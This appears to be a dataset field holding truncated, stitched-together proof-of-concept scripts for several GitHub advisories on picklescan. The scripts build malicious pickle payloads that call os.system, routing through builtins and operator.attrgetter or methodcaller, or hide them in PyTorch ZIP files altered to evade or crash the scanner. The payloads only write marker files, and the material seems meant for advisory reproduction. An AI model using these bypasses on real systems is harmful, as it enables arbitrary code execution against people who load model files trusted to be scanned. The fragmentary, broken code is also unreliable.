poc_entries.payload_code:
#!/usr/bin/env python3
import argparse
import pickle
import subprocess
from pathlib import Path


def build_attrgetter_payload(marker_path: Path) -> bytes:
    command = f"echo MARKER-GHSA-46h3-79wf-xr6c > {marker_path}"
    payload = (
        b"cbuiltins\n"
        b"__import__\n"
        b"(Vos\n"
        b"tR"
        b"p0\n"
        b"0c_operator\n"
        b"attrgetter\n"
        b"(Vsystem\n"
        b"tR"
        b"(g0\n"
        b"tR"
        + f"(V{command}\n".encode("utf-8")
        + b"tR."
    )
    return payload


def run_picklescan(scan_path: Path) -> str:
    command = ["picklescan", "-p", str(scan_path)]
    process = subprocess.run(command, capture_output=True, text=True, check=False)
    return (process.stdout + process.stderr).strip()


def victim_load(scan_path: Path)

Proof-of-Concept reproduction script for GHSA-769v-p64c-89pr.

"""

import argparse
import os
import subprocess
from pathlib import Path

    def __reduce__(self):
        return (os.system, ('echo MARKER-GHSA-769v-p64c-89pr > /tmp/hacked.txt',))
with zipfile.ZipFile('model.pt', 'w') as zf:
    # Use non-standard name; torch.load() accepts pickle_file paramete

# PoC for GHSA-7q5r-7gvp-wc82
# Vulnerability: picklescan ZIP header parsing (BadZipFile crash vs PyTorch fallback)
# Requirements: picklescan, torch
#
# Description: See https://github.com/advisories/GHSA-7q5r-7gvp-wc82

"""
Proof-of-Concept reproduction script for GHSA-7q5r-7gvp-wc82.
Run in a controlled, isolated environment only.
"""

import argparse
import os
import subprocess
from pathlib import Path


# Manipulate ZIP central directory header to crash picklescan but allow PyTorch to load
import pickle, os, zipfile, struct
class Payload:
    def __reduce__(self):
        return (os.system, ('echo MARKER-GHSA-7q5r-7gvp-wc82 > /tmp/hacked.txt',))
with zipfile.ZipFile('exploit.pt', 'w') as zf:
    zf.writestr('archive/data.pkl', pickle.dumps(Payload()))
# Corrupt

    return (process.stdout + process.stderr).strip()

# Requirements: picklescan<=0.0.30
#
# Description: See https://github.com/advisories/GHSA-f7qq-56ww-84cr

"""
Proof-of-Concept reproduction script for GHSA-f7qq-56ww-84cr.
Run in a controlled, isolated environment only.
"""

import argparse
import os
import subprocess
from pathlib import Path


# Use subclass of dangerous import to bypass strict exact-match globals check
import pickle
class EvilOS(__import__('os')._Environ):
    pass
class Payload:
    def __reduce__(self):
        return (EvilOS.__init__, (None, os.environ.__setitem__, os.environ.__delitem__, os.environ.__getitem__, os.environ.keys, None))
# Alternatively use a subclass reference not in pi

#!/usr/bin/env python3
# PoC for GHSA-w8jq-xcqf-f792
# Vulnerability: picklescan ZIP flag bit handling (bits 0x1, 0x20, 0x40 cause scan failure)
# Requirements: picklescan<0.0.23, torch
#
# Description: See https://github.com/advisories/GHSA-w8jq-xcqf-f792

"""
Proof-of-Concept reproduction script for GHSA-w8jq-xcqf-f792.
Run in a controlled, isolated environment only.
"""

import argparse
import os
import subprocess
from pathlib import Path


# Flip specific flag bits in ZIP local file header to bypass picklescan while keeping PyTorch-loadable
import pickle, os, zipfile
class Payload:
    def __reduce__(self):
        return (os.system, ('echo MARKER-GHSA-w8jq-xcqf-f792 > /tmp/hacked.txt',))
with zipfile.ZipFile('exploit.pt', 'w') as zf:
    zf.writestr('archive/data.pkl', pickle.dumps(Pa

#!/usr/bin/env python3
import argparse
import pickle
import subprocess
from pathlib import Path


def build_methodcaller_payload(marker_path: Path) -> bytes:
    command = f"echo MARKER-GHSA-x843-g5mx-g377 > {marker_path}"
    payload = (
        b"cbuiltins\n"
        b"__import__\n"
        b"(Vos\n"
        b"tR"
        b"p0\n"
        b"0coperator\n"
        b"methodcaller\n"
        b"(Vsystem\n"
        + f"V{command}\n".encode("utf-8")
        + b"tR"
        b"(g0\n"
        b"tR."
    )
    return payload


def run_picklescan(scan_path: Path) -> str:
    command = ["picklescan", "-p", str(scan_path)]
    process = subprocess.run(command, capture_output=True, text=True, check=False)
    return (process.stdout + process.stderr).strip()


def victim_load(scan_path: Path) -> None:
